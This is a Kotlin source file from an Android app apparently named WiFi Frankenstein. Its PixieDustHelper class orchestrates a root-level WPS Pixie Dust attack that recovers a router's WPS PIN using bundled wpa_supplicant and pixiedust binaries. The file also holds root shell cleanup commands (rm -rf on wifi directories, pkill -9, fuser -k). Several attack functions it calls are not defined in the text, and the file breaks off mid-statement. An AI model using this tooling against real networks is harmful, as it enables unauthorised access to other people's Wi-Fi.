package com.lsd.wififrankenstein.ui.pixiedust

import android.annotation.SuppressLint
import android.content.Context
import android.net.wifi.WifiManager
import android.os.Build
import com.lsd.wififrankenstein.util.Log
import com.lsd.wififrankenstein.R
import com.lsd.wififrankenstein.ui.iwscanner.IwInterface
import com.topjohnwu.superuser.Shell
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.async
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.BufferedReader
import java.io.InputStreamReader

class PixieDustHelper(
    private val context: Context,
    private val callbacks: PixieDustCallbacks
) {

    companion object {
        private const val TAG = "PixieDustHelper"
        private const val CONFIG_FILE = "wpa_supplicant.conf"
        private const val DEFAULT_PIN = "12345670"
    }

    private var attackJob: Job? = null
    private var copyingJob: Job? = null
    private var cleanupJob: Job? = null
    private var stoppingJob: Job? = null

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val binaryDir = context.filesDir.absolutePath
    private val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager

    private var supplicantProcess: Process? = null
    private var supplicantOutput: BufferedReader? = null
    private val pixieData = mutableMapOf<String, String>()
    private var pixieDataProgress = 0
    private val totalPixieDataFields = 6

    private var useAggressiveCleanup = false

    interface PixieDustCallbacks {
        fun onStateChanged(state: PixieAttackState)
        fun onProgressUpdate(message: String)
        fun onAttackCompleted(result: PixieResult)
        fun onAttackFailed(error: String, errorCode: Int)
        fun onLogEntry(logEntry: LogEntry)
        fun onInterfacesUpdated(interfaces: List<IwInterface>)
    }

    suspend fun getAvailableInterfaces(): List<IwInterface> = withContext(Dispatchers.IO) {
        try {
            val iwCommand = "iw dev"
            Log.d(TAG, "Executing command: $iwCommand")

            val result = Shell.cmd(iwCommand).exec()
            Log.d(TAG, "Command exit code: ${result.code}")
            Log.d(TAG, "Command success: ${result.isSuccess}")
            Log.d(TAG, "Command output lines: ${result.out.size}")

            result.out.forEachIndexed { index, line ->
                Log.d(TAG, "OUT[$index]: $line")
            }

            if (result.err.isNotEmpty()) {
                Log.w(TAG, "Command stderr lines: ${result.err.size}")
                result.err.forEachIndexed { index, line ->
                    Log.w(TAG, "ERR[$index]: $line")
                }
            }

            if (result.isSuccess && result.out.isNotEmpty()) {
                val interfaces = parseIwDevOutput(result.out.joinToString("\n"))
                Log.d(TAG, "Parsed ${interfaces.size} interfaces: ${interfaces.map { it.name }}")
                interfaces
            } else {
                Log.w(TAG, "Command failed or no output, using default wlan0")
                listOf(IwInterface("wlan0"))
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error getting interfaces", e)
            listOf(IwInterface("wlan0"))
        }
    }

    private fun parseInterfacesList(output: String): List<IwInterface> {
        Log.d(TAG, "Parsing interfaces list, input length: ${output.length} chars")

        val interfaces = mutableListOf<IwInterface>()
        val lines = output.lines()

        var currentInterface: String? = null
        var currentType = ""
        var currentAddr = ""

        lines.forEachIndexed { index, line ->
            val trimmed = line.trim()
            Log.v(TAG, "Interface parse line $index: $trimmed")

            when {
                trimmed.startsWith("Interface ") -> {
                    currentInterface?.let {
                        interfaces.add(IwInterface(it, currentType, currentAddr))
                        Log.d(TAG, "Added interface: name=$it, type=$currentType, addr=$currentAddr")
                    }
                    currentInterface = trimmed.substring(10).trim()
                    currentType = ""
                    currentAddr = ""
                    Log.d(TAG, "Started parsing interface: $currentInterface")
                }
                trimmed.startsWith("type ") -> {
                    currentType = trimmed.substring(5).trim()
                    Log.v(TAG, "Found type: $currentType")
                }
                trimmed.startsWith("addr ") -> {
                    currentAddr = trimmed.substring(5).trim()
                    Log.v(TAG, "Found addr: $currentAddr")
                }
            }
        }

        currentInterface?.let {
            interfaces.add(IwInterface(it, currentType, currentAddr))
            Log.d(TAG, "Added final interface: name=$it, type=$currentType, addr=$currentAddr")
        }

        val result = if (interfaces.isEmpty()) {
            Log.w(TAG, "No interfaces found, using default wlan0")
            listOf(IwInterface("wlan0"))
        } else {
            Log.d(TAG, "Successfully parsed ${interfaces.size} interfaces")
            interfaces
        }

        return result
    }

    private fun parseIwDevOutput(output: String): List<IwInterface> {
        return parseInterfacesList(output)
    }

    fun checkRootAccess(): Boolean {
        return try {
            val shell = Shell.getShell()
            shell.isRoot && shell.isAlive
        } catch (e: Exception) {
            Log.e(TAG, "Root check failed", e)
            false
        }
    }

    fun checkBinaryFiles(): Boolean {
        return try {
            Log.d(TAG, "Starting comprehensive binary files check with symlink diagnostics")

            val arch = if (Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()) "" else "-32"

            val requiredBinaries = listOf(
                "wpa_supplicant$arch",
                "wpa_cli$arch",
                "pixiedust$arch",
                "wpa_supplicant.conf"
            )

            val criticalLibraries = if (arch.isEmpty()) {
                listOf(
                    "libssl.so.1.1",
                    "libssl.so.3",
                    "libcrypto.so.1.1",
                    "libcrypto.so.3",
                    "libnl-3.so",
                    "libnl-genl-3.so"
                )
            } else {
                listOf(
                    "libssl.so.1.1",
                    "libssl.so.3",
                    "libcrypto.so.1.1",
                    "libcrypto.so.3",
                    "libnl-3.so-32",
                    "libnl-genl-3.so-32"
                )
            }

            val optionalLibraries = listOf(
                "libnl-route-3.so"
            )

            val criticalSymlinks = if (arch.isEmpty()) {
                emptyList()
            } else {
                listOf(
                    "libnl-3.so",
                    "libnl-genl-3.so"
                )
            }

            val optionalSymlinks = emptyList<String>()

            Log.d(TAG, "Checking ${requiredBinaries.size} binaries, ${criticalLibraries.size} critical + ${optionalLibraries.size} optional libraries, ${criticalSymlinks.size} critical + ${optionalSymlinks.size} optional symlinks")

            var allFilesOk = true
            var criticalMissing = false

            requiredBinaries.forEach { fileName ->
                val file = java.io.File(binaryDir, fileName)
                val exists = file.exists()
                val readable = exists && file.canRead()
                val executable = exists && file.canExecute()
                val size = if (exists) file.length() else 0

                val status = when {
                    !exists -> {
                        criticalMissing = true
                        "MISSING"
                    }
                    size == 0L -> {
                        criticalMissing = true
                        "EMPTY"
                    }
                    !readable -> {
                        criticalMissing = true
                        "NOT_READABLE"
                    }
                    fileName.contains("wpa_supplicant") && !executable -> {
                        criticalMissing = true
                        "NOT_EXECUTABLE"
                    }
                    else -> "OK"
                }

                Log.d(TAG, "Binary $fileName: $status, size=$size, readable=$readable, executable=$executable")

                if (status != "OK") {
                    allFilesOk = false
                }
            }

            criticalLibraries.forEach { fileName ->
                val file = java.io.File(binaryDir, fileName)
                val exists = file.exists()
                val size = if (exists) file.length() else 0
                val readable = exists && file.canRead()

                val status = when {
                    !exists -> "MISSING_CRITICAL"
                    size == 0L -> "EMPTY_CRITICAL"
                    !readable -> "NOT_READABLE_CRITICAL"
                    else -> "OK"
                }

                Log.d(TAG, "Critical library $fileName: $status, size=$size, readable=$readable")

                if (status.contains("CRITICAL")) {
                    criticalMissing = true
                    allFilesOk = false
                }
            }

            optionalLibraries.forEach { fileName ->
                val file = java.io.File(binaryDir, fileName)
                val exists = file.exists()
                val size = if (exists) file.length() else 0
                val readable = exists && file.canRead()

                val status = when {
                    !exists -> "MISSING_OPTIONAL"
                    size == 0L -> "EMPTY_OPTIONAL"
                    !readable -> "NOT_READABLE_OPTIONAL"
                    else -> "OK"
                }

                Log.d(TAG, "Optional library $fileName: $status, size=$size, readable=$readable")
            }

            Log.d(TAG, "=== SYMLINK DIAGNOSTICS ===")

            criticalSymlinks.forEach { linkName ->
                val symlinkStatus = checkSymlinkHealth(linkName)
                Log.d(TAG, "Critical symlink $linkName: $symlinkStatus")

                if (symlinkStatus.contains("BROKEN") || symlinkStatus.contains("MISSING") || symlinkStatus.contains("LOOP")) {
                    Log.e(TAG, "CRITICAL SYMLINK ISSUE: $linkName is $symlinkStatus")
                    allFilesOk = false
                    criticalMissing = true
                }
            }

            optionalSymlinks.forEach { linkName ->
                val symlinkStatus = checkSymlinkHealth(linkName)
                Log.d(TAG, "Optional symlink $linkName: $symlinkStatus")
            }

            Log.d(TAG, "=== END SYMLINK DIAGNOSTICS ===")

            Log.d(TAG, "Binary files check result: allFilesOk=$allFilesOk, criticalMissing=$criticalMissing")

            allFilesOk && !criticalMissing

        } catch (e: Exception) {
            Log.e(TAG, "Error during binary files check", e)
            false
        }
    }

    private fun checkSymlinkHealth(linkName: String): String {
        return try {
            val linkPath = "$binaryDir/$linkName"

            val existsResult = Shell.cmd("test -e $linkPath && echo 'EXISTS' || echo 'MISSING'").exec()
            if (existsResult.out.contains("MISSING")) {
                return "MISSING"
            }

            val isLinkResult = Shell.cmd("test -L $linkPath && echo 'SYMLINK' || echo 'NOT_SYMLINK'").exec()
            if (isLinkResult.out.contains("NOT_SYMLINK")) {
                return "NOT_SYMLINK"
            }

            val targetExistsResult = Shell.cmd("test -e $linkPath && echo 'TARGET_EXISTS' || echo 'TARGET_MISSING'").exec()
            if (targetExistsResult.out.contains("TARGET_MISSING")) {
                return "BROKEN_TARGET"
            }

            val realPathResult = Shell.cmd("readlink -f $linkPath 2>/dev/null || echo 'CANNOT_RESOLVE'").exec()
            if (realPathResult.out.contains("CANNOT_RESOLVE")) {
                return "LOOP_OR_ERROR"
            }

            val finalPath = realPathResult.out.joinToString().trim()
            val readableResult = Shell.cmd("test -r '$finalPath' && echo 'READABLE' || echo 'NOT_READABLE'").exec()
            if (readableResult.out.contains("NOT_READABLE")) {
                return "TARGET_NOT_READABLE"
            }

            val linkInfoResult = Shell.cmd("ls -la $linkPath").exec()
            val linkInfo = linkInfoResult.out.joinToString()
            Log.d(TAG, "Symlink $linkName info: $linkInfo -> $finalPath")

            "OK"

        } catch (e: Exception) {
            Log.e(TAG, "Error checking symlink $linkName: ${e.message}", e)
            "CHECK_ERROR"
        }
    }

    fun copyBinariesFromAssets() {
        if (copyingJob?.isActive == true) {
            Log.w(TAG, "Binary copying already in progress")
            return
        }

        copyingJob = scope.launch {
            try {
                callbacks.onProgressUpdate(context.getString(R.string.pixiedust_copying_binaries))

                val arch = if (Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()) "" else "-32"
                val binaries = listOf(
                    "wpa_supplicant$arch",
                    "wpa_cli$arch",
                    "pixiedust$arch",
                    CONFIG_FILE
                )

                val libraries = if (arch.isEmpty()) {
                    listOf(
                        "libssl.so.1.1",
                        "libssl.so.3",
                        "libcrypto.so.1.1",
                        "libcrypto.so.3",
                        "libnl-3.so",
                        "libnl-genl-3.so",
                        "libnl-route-3.so"
                    )
                } else {
                    listOf(
                        "libssl.so.1.1",
                        "libssl.so.3",
                        "libcrypto.so.1.1",
                        "libcrypto.so.3",
                        "libnl-3.so-32",
                        "libnl-genl-3.so-32",
                        "libnl-route-3.so"
                    )
                }

                binaries.forEach { fileName ->
                    if (copyAssetToInternalStorage(fileName, fileName)) {
                        Shell.cmd("chmod 755 $binaryDir/$fileName").exec()
                    }
                }

                libraries.forEach { libName ->
                    copyAssetToInternalStorage(libName, libName)
                    Shell.cmd("chmod 755 $binaryDir/$libName").exec()
                }

                if (arch.isNotEmpty()) {
                    createLibrarySymlinks()
                }
                callbacks.onProgressUpdate(context.getString(R.string.pixiedust_binaries_ready))

            } catch (e: Exception) {
                Log.e(TAG, "Error copying binaries", e)
                callbacks.onAttackFailed(context.getString(R.string.pixiedust_error_copying_binaries), -10)
            } finally {
                copyingJob = null
            }
        }
    }

    private fun createLibrarySymlinks() {
        val symlinkConfigs = listOf(
            Pair("libnl-3.so-32", "libnl-3.so"),
            Pair("libnl-genl-3.so-32", "libnl-genl-3.so")
        )

        symlinkConfigs.forEach { (sourceFile, linkName) ->
            createSafeSymlink(sourceFile, linkName)
        }
    }

    private fun createSafeSymlink(sourceFile: String, linkName: String) {
        try {
            val sourcePath = "$binaryDir/$sourceFile"
            val linkPath = "$binaryDir/$linkName"

            val sourceExists = Shell.cmd("test -f $sourcePath && echo 'EXISTS' || echo 'MISSING'").exec()
            if (sourceExists.out.contains("MISSING")) {
                Log.w(TAG, "Source file missing for symlink: $sourceFile")
                return
            }

            Shell.cmd("rm -f $linkPath").exec()

            val createResult = Shell.cmd("cd $binaryDir && ln -sf $sourceFile $linkName").exec()

            if (createResult.isSuccess) {
                val verifyResult = Shell.cmd("test -L $linkPath && test -e $linkPath && echo 'VALID' || echo 'INVALID'").exec()

                if (verifyResult.out.contains("VALID")) {
                    Log.d(TAG, "✓ Created valid symlink: $linkName -> $sourceFile")

                    val linkInfo = Shell.cmd("ls -la $linkPath").exec()
                    Log.d(TAG, "Symlink info: ${linkInfo.out.joinToString()}")
                } else {
                    Log.e(TAG, "✗ Created invalid symlink: $linkName")
                    Shell.cmd("rm -f $linkPath").exec()
                }
            } else {
                Log.e(TAG, "✗ Failed to create symlink: $linkName -> $sourceFile")
            }

        } catch (e: Exception) {
            Log.e(TAG, "Error creating symlink $linkName: ${e.message}", e)
        }
    }

    fun setAggressiveCleanup(enabled: Boolean) {
        useAggressiveCleanup = enabled
    }

    private fun copyAssetToInternalStorage(assetName: String, fileName: String): Boolean {
        return try {
            context.assets.open(assetName).use { input ->
                context.openFileOutput(fileName, Context.MODE_PRIVATE).use { output ->
                    input.copyTo(output)
                }
            }
            true
        } catch (e: Exception) {
            Log.w(TAG, "Failed to copy $assetName", e)
            false
        }
    }

    fun startPixieAttack(network: WpsNetwork, interfaceName: String = "wlan0", extractionTimeout: Long = 30000L, computationTimeout: Long = 300000L) {
        if (attackJob?.isActive == true) {
            Log.w(TAG, "Attack already in progress")
            return
        }

        pixieData.clear()
        pixieDataProgress = 0
        wpsProcessStarted = false
        notVulnerableWarningShown = false
        currentBssid = ""
        currentEssid = ""

        attackJob = scope.launch {
            try {
                callbacks.onLogEntry(LogEntry("Starting PixieDust attack on ${network.ssid} via $interfaceName"))

                callbacks.onStateChanged(PixieAttackState.CheckingRoot)
                callbacks.onProgressUpdate(context.getString(R.string.pixiedust_checking_root))

                if (!checkRootAccess()) {
                    callbacks.onAttackFailed(context.getString(R.string.pixiedust_root_not_available), -1)
                    return@launch
                }

                if (!checkBinaryFiles()) {
                    copyBinariesFromAssets()
                    delay(3000)

                    if (!checkBinaryFiles()) {
                        callbacks.onAttackFailed(context.getString(R.string.pixiedust_binary_files_not_available), -2)
                        return@launch
                    }
                }

                callbacks.onStateChanged(PixieAttackState.Preparing)
                callbacks.onProgressUpdate(context.getString(R.string.pixiedust_preparing_attack))

                stopExistingProcesses()
                delay(3000)

                val startTime = System.currentTimeMillis()
                val socketDir = getSocketDirectory()

                if (!startSupplicant(socketDir, interfaceName)) {
                    forceStopAllProcesses()
                    callbacks.onAttackFailed(context.getString(R.string.pixiedust_failed_start_supplicant), -3)
                    return@launch
                }

                delay(3000)

                callbacks.onStateChanged(PixieAttackState.ExtractingData)
                callbacks.onProgressUpdate(context.getString(R.string.pixiedust_extracting_handshake))

                performWpsRegistration(network, socketDir, interfaceName)
                delay(8000)

                val attackData = extractPixieData(extractionTimeout)
                if (attackData == null) {
                    Log.w(TAG, "Failed to extract complete pixie data set")
                    forceStopAllProcesses()
                    callbacks.onAttackFailed(context.getString(R.string.pixiedust_data_extraction_failed), -4)
                    return@launch
                }

                callbacks.onStateChanged(PixieAttackState.RunningAttack)
                callbacks.onProgressUpdate(context.getString(R.string.pixiedust_computing_pin))

                val pin = executePixieAttack(attackData, computationTimeout)
                val duration = System.currentTimeMillis() - startTime

                val result = PixieResult(
                    network = network,
                    pin = pin,
                    success = pin != null,
                    duration = duration
                )

                cleanupAfterAttack()

                callbacks.onStateChanged(PixieAttackState.Completed(result))
                callbacks.onAttackCompleted(result)

                if (pin != null) {
                    callbacks.onLogEntry(LogEntry("PIN found: $pin", LogColorType.INFO))
                } else {
                    callbacks.onLogEntry(LogEntry("WPS pin not found!", LogColorType.ERROR))
                }

            } catch (e: Exception) {
                Log.e(TAG, "PixieDust attack failed", e)
                forceStopAllProcesses()
                cleanupAfterAttack()
                callbacks.onLogEntry(LogEntry("Attack failed: ${e.message}", LogColorType.ERROR))
                callbacks.onAttackFailed(context.getString(R.string.pixiedust_attack_error, e.message ?: "Unknown"), -5)
            } finally {
                attackJob = null
            }
        }
    }

    suspend fun cleanupAfterAttack() {
        withContext(Dispatchers.IO) {
            try {
                callbacks.onProgressUpdate(context.getString(R.string.pixiedust_cleaning_up))
                callbacks.onLogEntry(LogEntry("=== CLEANUP STARTED ===", LogColorType.INFO))

                callbacks.onLogEntry(LogEntry("Stopping our processes...", LogColorType.INFO))
                forceStopAllProcesses()
                delay(2000)

                callbacks.onLogEntry(LogEntry("Cleaning isolated files...", LogColorType.INFO))
                cleanupIsolatedFiles()
                delay(1000)

                if (useAggressiveCleanup) {
                    callbacks.onLogEntry(LogEntry("Restoring system WiFi services...", LogColorType.INFO))
                    restoreSystemWifiServices()
                    delay(3000)
                }

                callbacks.onLogEntry(LogEntry("Restoring WiFi state...", LogColorType.INFO))
                restoreWifiState()
                delay(3000)

                callbacks.onLogEntry(LogEntry("=== CLEANUP COMPLETED ===", LogColorType.SUCCESS))

            } catch (e: Exception) {
                Log.e(TAG, "Error during cleanup", e)
                callbacks.onLogEntry(LogEntry("Cleanup error: ${e.message}", LogColorType.ERROR))
            }
        }
    }

    private suspend fun restoreSystemWifiServices() {
        withContext(Dispatchers.IO) {
            try {
                if (!useAggressiveCleanup) {
                    callbacks.onLogEntry(LogEntry("Skipping system services restore (simple mode)", LogColorType.INFO))
                    return@withContext
                }

                callbacks.onLogEntry(LogEntry("Safely starting system WiFi services...", LogColorType.INFO))

                val restoreSettings = listOf(
                    "settings put global wifi_networks_available_notification_on 1",
                    "settings put global wifi_scan_always_enabled 1",
                    "settings put global wifi_sleep_policy 2",
                    "settings put secure wifi_watchdog_on 1"
                )

                restoreSettings.forEach { command ->
                    Shell.cmd(command).exec()
                    delay(200)
                }

                val interfaceCommands = listOf(
                    "ifconfig wlan0 up",
                    "ip link set wlan0 up"
                )

                interfaceCommands.forEach { command ->
                    Shell.cmd(command).exec()
                    delay(500)
                }

                val startServices = listOf(
                    "start wifi",
                    "start wifihal",
                    "setprop ctl.start wifi",
                    "setprop ctl.start wpa_supplicant"
                )

                startServices.forEach { command ->
                    val result = Shell.cmd(command).exec()
                    if (result.isSuccess) {
                        callbacks.onLogEntry(LogEntry("✓ $command", LogColorType.SUCCESS))
                    } else {
                        callbacks.onLogEntry(LogEntry("⚠ $command failed", LogColorType.ERROR))
                    }
                    delay(1000)
                }

                callbacks.onLogEntry(LogEntry("System WiFi services restored safely", LogColorType.SUCCESS))

            } catch (e: Exception) {
                Log.w(TAG, "Error restoring system services", e)
                callbacks.onLogEntry(LogEntry("Error restoring services: ${e.message}", LogColorType.ERROR))
            }
        }
    }

    private suspend fun cleanupIsolatedFiles() {
        withContext(Dispatchers.IO) {
            try {
                callbacks.onLogEntry(LogEntry("Cleaning up isolated files...", LogColorType.INFO))

                val cleanupCommands = listOf(
                    "rm -rf $binaryDir/isolated_config/",
                    "rm -rf /data/misc/wifi/wififrankenstein/",
                    "rm -rf /data/vendor/wifi/wpa/wififrankenstein/"
                )

                cleanupCommands.forEach { command ->
                    Shell.cmd(command).exec()
                    delay(100)
                }

                callbacks.onLogEntry(LogEntry("Isolated files cleaned", LogColorType.SUCCESS))

            } catch (e: Exception) {
                Log.w(TAG, "Error cleaning isolated files", e)
                callbacks.onLogEntry(LogEntry("Error cleaning files: ${e.message}", LogColorType.ERROR))
            }
        }
    }

    fun cleanupAllBinaries() {
        if (cleanupJob?.isActive == true) {
            Log.w(TAG, "Binary cleanup already in progress")
            return
        }

        cleanupJob = scope.launch {
            try {
                callbacks.onProgressUpdate(context.getString(R.string.pixiedust_cleaning_binaries))
                callbacks.onLogEntry(LogEntry("=== CLEANING ALL BINARIES ===", LogColorType.INFO))

                callbacks.onLogEntry(LogEntry("Phase 1: Ensuring our processes are stopped", LogColorType.INFO))
                ensureOurProcessesStopped()
                delay(2000)

                callbacks.onLogEntry(LogEntry("Phase 2: Unlocking our files", LogColorType.INFO))
                unlockOurFiles()
                delay(1000)

                callbacks.onLogEntry(LogEntry("Phase 3: Removing broken symlinks", LogColorType.INFO))
                removeOurSymlinks()
                delay(500)

                callbacks.onLogEntry(LogEntry("Phase 4: Removing our binary files", LogColorType.INFO))
                removeOurBinaryFiles()
                delay(500)

                callbacks.onLogEntry(LogEntry("Phase 5: Cleaning our temporary directories", LogColorType.INFO))
                cleanOurTemporaryDirectories()
                delay(500)

                callbacks.onLogEntry(LogEntry("Phase 6: Restoring directory permissions", LogColorType.INFO))
                restoreOurDirectoryPermissions()
                delay(500)

                callbacks.onLogEntry(LogEntry("Phase 7: Final verification", LogColorType.INFO))
                performFinalBinaryVerification()

                callbacks.onLogEntry(LogEntry("=== BINARY CLEANUP COMPLETED ===", LogColorType.SUCCESS))
                callbacks.onProgressUpdate(context.getString(R.string.pixiedust_cleanup_completed))

            } catch (e: Exception) {
                Log.e(TAG, "Error during binary cleanup", e)
                callbacks.onLogEntry(LogEntry("Cleanup error: ${e.message}", LogColorType.ERROR))
                callbacks.onProgressUpdate(context.getString(R.string.pixiedust_cleanup_error))
            } finally {
                cleanupJob = null
            }
        }
    }

    private suspend fun ensureOurProcessesStopped() {
        withContext(Dispatchers.IO) {
            try {
                try {
                    supplicantProcess?.destroy()
                    supplicantOutput?.close()
                    supplicantProcess = null
                    supplicantOutput = null
                    callbacks.onLogEntry(LogEntry("✓ Closed our process handles", LogColorType.SUCCESS))
                } catch (_: Exception) {
                    callbacks.onLogEntry(LogEntry("ℹ Process handles already closed", LogColorType.INFO))
                }

                val ourProcesses = Shell.cmd("ps aux | grep $binaryDir | grep -v grep").exec()
                if (ourProcesses.out.isNotEmpty()) {
                    callbacks.onLogEntry(LogEntry("Found ${ourProcesses.out.size} processes using our directory:", LogColorType.INFO))
                    ourProcesses.out.forEach { process ->
                        callbacks.onLogEntry(LogEntry("  $process", LogColorType.INFO))
                    }

                    val killResult = Shell.cmd("pkill -9 -f $binaryDir").exec()
                    if (killResult.isSuccess) {
                        callbacks.onLogEntry(LogEntry("✓ Terminated our processes", LogColorType.SUCCESS))
                    }
                } else {
                    callbacks.onLogEntry(LogEntry("✓ No processes using our directory", LogColorType.SUCCESS))
                }

            } catch (e: Exception) {
                callbacks.onLogEntry(LogEntry("Process cleanup error: ${e.message}", LogColorType.ERROR))
            }
        }
    }

    private suspend fun unlockOurFiles() {
        withContext(Dispatchers.IO) {
            try {
                val lockedFiles = Shell.cmd("lsof $binaryDir/* 2>/dev/null || echo 'No locked files'").exec()

                if (lockedFiles.out.any { !it.contains("No locked files") && it.isNotBlank() }) {
                    callbacks.onLogEntry(LogEntry("Found locked files in our directory:", LogColorType.INFO))
                    lockedFiles.out.forEach { line ->
                        if (!line.contains("No locked files") && line.isNotBlank()) {
                            callbacks.onLogEntry(LogEntry("  $line", LogColorType.INFO))
                        }
                    }

                    Shell.cmd("fuser -k $binaryDir/* 2>/dev/null || true").exec()
                    delay(1000)

                    callbacks.onLogEntry(LogEntry("✓ Unlocked our files", LogColorType.SUCCESS))
                } else {
                    callbacks.onLogEntry(LogEntry("✓ No locked files in our directory", LogColorType.SUCCESS))
                }

                val ourSocketDirs = listOf(
                    "/data/vendor/wifi/wpa/wififrankenstein/",
                    "/data/misc/wifi/wififrankenstein/"
                )

                ourSocketDirs.forEach { dir ->
                    val result = Shell.cmd("rm -rf $dir").exec()
                    if (result.isSuccess) {
                        callbacks.onLogEntry(LogEntry("✓ Cleaned our socket directory: $dir", LogColorType.SUCCESS))
                    }
                }

            } catch (e: Exception) {
                callbacks.onLogEntry(LogEntry("File unlock error: ${e.message}", LogColorType.ERROR))
            }
        }
    }

    private suspend fun removeOurSymlinks() {
        withContext(Dispatchers.IO) {
            try {
                val arch = if (Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()) "" else "-32"
                val ourSymlinks = if (arch.isEmpty()) {
                    emptyList()
                } else {
                    listOf(
                        "libnl-3.so",
                        "libnl-genl-3.so"
                    )
                }

                ourSymlinks.forEach { linkName ->
                    val linkPath = "$binaryDir/$linkName"

                    val exists = Shell.cmd("test -e $linkPath && echo 'EXISTS' || echo 'NOT_EXISTS'").exec()

                    if (exists.out.contains("EXISTS")) {
                        val linkInfo = Shell.cmd("ls -la $linkPath 2>/dev/null || echo 'Cannot read'").exec()
                        callbacks.onLogEntry(LogEntry("Symlink $linkName: ${linkInfo.out.joinToString()}", LogColorType.INFO))

                        val removeResult = Shell.cmd("rm -f $linkPath").exec()
                        if (removeResult.isSuccess) {
                            callbacks.onLogEntry(LogEntry("✓ Removed symlink: $linkName", LogColorType.SUCCESS))
                        } else {
                            callbacks.onLogEntry(LogEntry("⚠ Failed to remove symlink: $linkName", LogColorType.ERROR))
                        }
                    } else {
                        callbacks.onLogEntry(LogEntry("ℹ Symlink not found: $linkName", LogColorType.INFO))
                    }
                }

            } catch (e: Exception) {
                callbacks.onLogEntry(LogEntry("Symlink cleanup error: ${e.message}", LogColorType.ERROR))
            }
        }
    }

    private suspend fun removeOurBinaryFiles() {
        withContext(Dispatchers.IO) {
            try {
                val arch = if (Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()) "" else "-32"
                val filesToRemove = mutableListOf(
                    "wpa_supplicant$arch",
                    "wpa_cli$arch",
                    "pixiedust$arch",
                    "wpa_supplicant.conf",
                    "libssl.so.1.1",
                    "libssl.so.3",
                    "libcrypto.so.1.1",
                    "libcrypto.so.3",
                    "libnl-route-3.so",
                    "temp_isolated_config.txt",
                    "wpa_supplicant.pid"
                )

                if (arch.isEmpty()) {
                    filesToRemove.addAll(listOf(
                        "libnl-3.so",
                        "libnl-genl-3.so"
                    ))
                } else {
                    filesToRemove.addAll(listOf(
                        "libnl-3.so-32",
                        "libnl-genl-3.so-32",
                        "libnl-3.so",        // symlink
                        "libnl-genl-3.so"   // symlink
                    ))
                }

                var removedCount = 0
                var notFoundCount = 0

                filesToRemove.forEach { fileName ->
                    try {
                        val file = java.io.File(binaryDir, fileName)
                        if (file.exists()) {
                            Shell.cmd("chmod 666 $binaryDir/$fileName 2>/dev/null || true").exec()

                            if (file.delete()) {
                                callbacks.onLogEntry(LogEntry("✓ Removed: $fileName", LogColorType.SUCCESS))
                                removedCount++
                            } else {
                                val shellResult = Shell.cmd("rm -f $binaryDir/$fileName").exec()
                                if (shellResult.isSuccess) {
                                    callbacks.onLogEntry(LogEntry("✓ Force removed: $fileName", LogColorType.SUCCESS))
                                    removedCount++
                                } else {
                                    callbacks.onLogEntry(LogEntry("✗ Failed to remove: $fileName", LogColorType.ERROR))
                                }
                            }
                        } else {
                            callbacks.onLogEntry(LogEntry("ℹ File not found: $fileName", LogColorType.INFO))
                            notFoundCount++
                        }
                    } catch (e: Exception) {
                        callbacks.onLogEntry(LogEntry("✗ Error removing $fileName: ${e.message}", LogColorType.ERROR))
                    }
                }

                callbacks.onLogEntry(LogEntry("Binary cleanup: $removedCount removed, $notFoundCount not found", LogColorType.INFO))

                val wildcardCleanup = listOf(
                    "rm -f $binaryDir/temp_wpa_config*.conf",
                    "rm -f $binaryDir/*.pid"
                )

                wildcardCleanup.forEach { command ->
                    Shell.cmd(command).exec()
                }

            } catch (e: Exception) {
                callbacks.onLogEntry(LogEntry("Binary removal error: ${e.message}", LogColorType.ERROR))
            }
        }
    }

    private suspend fun cleanOurTemporaryDirectories() {
        withContext(Dispatchers.IO) {
            try {
                val ourDirectories = listOf(
                    "$binaryDir/isolated_config/",
                    "/data/misc/wifi/wififrankenstein/",
                    "/data/vendor/wifi/wpa/wififrankenstein/"
                )

                ourDirectories.forEach { dir ->
                    try {
                        val result = Shell.cmd("rm -rf $dir").exec()
                        if (result.isSuccess) {
                            callbacks.onLogEntry(LogEntry("✓ Cleaned directory: $dir", LogColorType.SUCCESS))
                        } else {
                            callbacks.onLogEntry(LogEntry("ℹ Directory not found: $dir", LogColorType.INFO))
                        }
                    } catch (e: Exception) {
                        callbacks.onLogEntry(LogEntry("⚠ Error cleaning $dir: ${e.message}", LogColorType.ERROR))
                    }
                }

            } catch (e: Exception) {
                callbacks.onLogEntry(LogEntry("Directory cleanup error: ${e.message}", LogColorType.ERROR))
            }
        }
    }

    private suspend fun restoreOurDirectoryPermissions() {
        withContext(Dispatchers.IO) {
            try {
                val result = Shell.cmd("chmod 755 $binaryDir").exec()
                if (result.isSuccess) {
                    callbacks.onLogEntry(LogEntry("✓ Restored directory permissions", LogColorType.SUCCESS))
                } else {
                    callbacks.onLogEntry(LogEntry("⚠ Failed to restore directory permissions", LogColorType.ERROR))
                }

                val checkPerms = Shell.cmd("ls -ld $binaryDir").exec()
                if (checkPerms.isSuccess) {
                    callbacks.onLogEntry(LogEntry("Directory permissions: ${checkPerms.out.joinToString()}", LogColorType.INFO))
                }

            } catch (e: Exception) {
                callbacks.onLogEntry(LogEntry("Permission restore error: ${e.message}", LogColorType.ERROR))
            }
        }
    }

    private suspend fun performFinalBinaryVerification() {
        withContext(Dispatchers.IO) {
            try {
                val remainingFiles = Shell.cmd("ls -la $binaryDir/ | grep -E 'wpa_|pixiedust|lib.*\\.so' || echo 'No binary files found'").exec()

                if (remainingFiles.out.any { it.contains("No binary files found") }) {
                    callbacks.onLogEntry(LogEntry("✓ All binary files removed successfully", LogColorType.SUCCESS))
                } else {
                    callbacks.onLogEntry(LogEntry("ℹ Some files still present (may be system files):", LogColorType.INFO))
                    remainingFiles.out.forEach { file ->
                        if (!file.contains("No binary files found")) {
                            callbacks.onLogEntry(LogEntry("  $file", LogColorType.INFO))
                        }
                    }
                }

                val writeTest = Shell.cmd("touch $binaryDir/cleanup_test.tmp && rm -f $binaryDir/cleanup_test.tmp").exec()
                if (writeTest.isSuccess) {
